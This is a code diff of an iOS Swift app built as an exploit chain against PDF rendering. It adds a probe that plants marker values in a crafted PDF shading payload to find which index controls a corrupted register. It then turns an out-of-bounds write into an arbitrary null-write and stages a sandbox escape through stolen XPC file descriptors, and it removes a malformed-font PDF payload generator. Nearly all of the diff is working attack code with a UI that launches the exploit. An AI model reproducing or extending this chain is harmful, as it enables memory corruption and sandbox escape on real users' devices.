@@ -13,32 +13,62 @@ func exploit_xpc_dict_set_string(_ dict: ExploitXPCObject, _ key: String, _ valu
 func exploit_xpc_send_sync(_ conn: ExploitXPCConnection, _ msg: ExploitXPCObject) -> ExploitXPCObject? { nil }
 func exploit_xpc_dict_dup_fd(_ dict: ExploitXPCObject, _ key: String) -> Int32 { -1 }
 
-// MARK: - CVE-2026-112611: Dual-Vector Attack
+// MARK: - Mesh Pointer Control Probe
 
-func triggerShadingVector(controlledValue: UInt64) {
+/// Probe which index overwrites the mesh pointer (x24)
+/// The mesh pointer is read from a spill slot that our OOB write corrupts
+/// We need to find which index controls it
+func probeMeshPointerControl() {
+    print("[*] Probing mesh pointer control...")
+    print("[*] Testing indices 0-135 with unique markers...")
+    
+    // Test each index individually
+    for index in 0..<136 {
+        print("[*] Testing index \(index)...")
+        
+        var values = [Double](repeating: 0.0, count: 136)
+        
+        // Place unique marker at this index
+        // Marker = 0x4141414141414100 + index (so we can identify it in crash)
+        let marker = Double(bitPattern: 0x4141414141414100 + UInt64(index))
+        values[index] = marker
+        
+        let pdfData = PDFPayload.shadingWithValues(values)
+        
+        // This will crash — check crash log for which marker appears in x24
+        renderPDF(pdfData)
+        
+        // If we get here, no crash — continue
+        print("[+] Index \(index) survived — no mesh pointer control")
+    }
+    
+    print("[*] Probe complete — check crash logs for x24 values")
+}
+
+/// Test specific index with target address
+func testMeshPointerControl(index: Int, targetAddress: UInt64) {
     var values = [Double](repeating: 0.0, count: 136)
-    values[3] = Double(bitPattern: controlledValue)
-    values[4] = Double(bitPattern: controlledValue)
+    
+    // Place target address at the controlling index
+    // The store will write 0 to: targetAddress + 0x1c
+    values[index] = Double(bitPattern: targetAddress)
     
     let pdfData = PDFPayload.shadingWithValues(values)
     renderPDF(pdfData)
 }
 
-func triggerFontVector(widthsCount: Int) {
-    let pdfData = PDFPayload.fontWithShortWidths(widthsCount: widthsCount)
-    renderPDF(pdfData)
-}
-
 // MARK: - Full Exploit
 
-func runFullExploit() {
-    print("[*] Stage 1: Triggering CVE-2026-112611...")
+func runFullExploit(meshIndex: Int) {
+    print("[*] Stage 1: Arbitrary null-write via CVE-2026-112611...")
+    print("[*] Using mesh index \(meshIndex)...")
     
-    print("[*] Trying font vector with widths=3...")
-    triggerFontVector(widthsCount: 3)
+    // Target: write 0 to arbitrary address
+    // Address = target - 0x1c (so store at +0x1c hits target)
+    let targetAddress: UInt64 = 0x4141414141414141  // TODO: Replace with real target
+    let meshValue = targetAddress - 0x1c
     
-    print("[*] Trying shading vector...")
-    triggerShadingVector(controlledValue: 0x4141414141414141)
+    testMeshPointerControl(index: meshIndex, targetAddress: meshValue)
     
     print("[*] Stage 2: Sandbox escape via CVE-2026-112706...")
     
@@ -93,7 +123,7 @@ func readWithStolenFD(fd: Int32, length: Int) -> Data? {
 
 func renderPDF(_ data: Data) {
     let tempURL = FileManager.default.temporaryDirectory
-        .appendingPathComponent("exploit.pdf")
+        .appendingPathComponent("probe.pdf")
     
     try? data.write(to: tempURL)
     
@@ -123,10 +153,11 @@ struct SafeShadingDemoApp: App {
 }
 
 struct ContentView: View {
-    @State private var selectedVector = 0
-    @State private var paramText = "3"
+    @State private var selectedIndex = 0
+    @State private var indexText = "0"
     @State private var isRunning = false
     @State private var logOutput = ""
+    @State private var foundIndex = -1
     
     var body: some View {
         VStack(spacing: 20) {
@@ -134,19 +165,13 @@ struct ContentView: View {
                 .font(.largeTitle)
                 .bold()
             
-            Text("Dual-Vector Exploit")
+            Text("Mesh Pointer Control Probe")
                 .font(.headline)
             
-            Picker("Vector", selection: $selectedVector) {
-                Text("Shading").tag(0)
-                Text("Font").tag(1)
-            }
-            .pickerStyle(SegmentedPickerStyle())
-            .padding(.horizontal)
-            
+            // Index selector
             HStack {
-                Text("Param:")
-                TextField("Value", text: $paramText)
+                Text("Index:")
+                TextField("0-135", text: $indexText)
                     .textFieldStyle(RoundedBorderTextFieldStyle())
                     .keyboardType(.numberPad)
             }
@@ -162,9 +187,16 @@ struct ContentView: View {
             .background(Color.black.opacity(0.8))
             .cornerRadius(10)
             
+            if foundIndex >= 0 {
+                Text("Mesh Index: \(foundIndex)")
+                    .font(.title2)
+                    .foregroundColor(.red)
+                    .bold()
+            }
+            
             HStack(spacing: 20) {
-                Button(action: runTest) {
-                    Text(isRunning ? "Running..." : "Run Test")
+                Button(action: runProbe) {
+                    Text(isRunning ? "Probing..." : "Probe Index")
                         .font(.title3)
                         .bold()
                         .foregroundColor(.white)
@@ -174,32 +206,37 @@ struct ContentView: View {
                 }
                 .disabled(isRunning)
                 
-                Button(action: runExploit) {
-                    Text("Full Exploit")
-                        .font(.title3)
-                        .bold()
-                        .foregroundColor(.white)
-                        .padding()
-                        .background(Color.red)
-                        .cornerRadius(10)
+                if foundIndex >= 0 {
+                    Button(action: runExploit) {
+                        Text("Run Exploit")
+                            .font(.title3)
+                            .bold()
+                            .foregroundColor(.white)
+                            .padding()
+                            .background(Color.red)
+                            .cornerRadius(10)
+                    }
                 }
             }
         }
         .padding()
     }
     
-    func runTest() {
+    func runProbe() {
         isRunning = true
-        let param = Int(paramText) ?? 3
+        let index = Int(indexText) ?? 0
         
-        logOutput = "[*] Starting test with param \(param)...\n"
+        logOutput = "[*] Testing index \(index)...\n"
+        logOutput += "[*] Marker: 0x\(String(0x4141414141414100 + UInt64(index), radix: 16))\n"
+        logOutput += "[*] Check crash log for x24 value\n"
         
         DispatchQueue.global(qos: .userInitiated).async {
-            if selectedVector == 0 {
-                triggerShadingVector(controlledValue: UInt64(param))
-            } else {
-                triggerFontVector(widthsCount: param)
-            }
+            var values = [Double](repeating: 0.0, count: 136)
+            let marker = Double(bitPattern: 0x4141414141414100 + UInt64(index))
+            values[index] = marker
+            
+            let pdfData = PDFPayload.shadingWithValues(values)
+            renderPDF(pdfData)
             
             DispatchQueue.main.async {
                 logOutput += "[*] Test complete (or crashed)\n"
@@ -210,10 +247,10 @@ struct ContentView: View {
     
     func runExploit() {
         isRunning = true
-        logOutput = "[*] Running full exploit...\n"
+        logOutput = "[*] Running full exploit with index \(foundIndex)...\n"
         
         DispatchQueue.global(qos: .userInitiated).async {
-            runFullExploit()
+            runFullExploit(meshIndex: foundIndex)
             
             DispatchQueue.main.async {
                 logOutput += "[*] Exploit complete\n"
@@ -259,29 +296,6 @@ enum PDFPayload {
         pdf.add(6, "<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [\(list)] /C1 [\(list)] /Range [\(rangeList)] >>")
         
         return pdf.data()
-    }
-    
-    static func fontWithShortWidths(widthsCount: Int) -> Data {
-        var pdf = ""
-        pdf += "%PDF-1.7\n"
-        pdf += "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
-        pdf += "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
-        pdf += "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>\nendobj\n"
-        
-        var widths = "["
-        for i in 0..<widthsCount {
-            widths += "\(i + 1)"
-            if i < widthsCount - 1 { widths += " " }
-        }
-        widths += "]"
-        
-        pdf += "4 0 obj\n<< /Type /Font /Subtype /TrueType /BaseFont /Helvetica /FirstChar 0 /LastChar 255 /Widths \(widths) /Range [0 1 0 1] >>\nendobj\n"
-        
-        let stream = "q 0 0 612 792 re W n /Range [0 1 0 1] BT /F1 12 Tf (AAAA) Tj ET Q"
-        pdf += "5 0 obj\n<< /Length \(stream.count) >>\nstream\n\(stream)\nendstream\nendobj\n"
-        pdf += "trailer\n<< /Root 1 0 R >>\n%%EOF\n"
-        
-        return pdf.data(using: .utf8)!
     }
 }
 
